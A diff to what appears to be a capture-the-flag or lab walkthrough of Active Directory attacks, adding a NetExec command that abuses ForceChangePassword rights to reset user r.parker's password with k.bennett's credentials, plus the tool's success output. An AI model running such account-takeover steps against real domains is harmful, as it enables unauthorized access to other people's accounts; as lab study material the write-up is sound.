@@ -1068,5 +1068,10 @@ The user `r.parker` seems the most interesting here, since he has GenericWrite o
 So my current user has ForceChangePassword on three users and `r.parker` seems the most interesting
 
 ```python
-
+nxc smb dc.northstone.local -u k.bennett -p 'B#8tL!2qPz@6YxM' -M change-password -o USER=r.parker NEWPASS=Password123!
+SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.209.181    445    DC               [+] northstone.local\k.bennett:B#8tL!2qPz@6YxM 
+CHANGE-P... 10.1.209.181    445    DC               [+] Successfully changed password for r.parker
 ```
+
+Now the password should be changed i can verify this
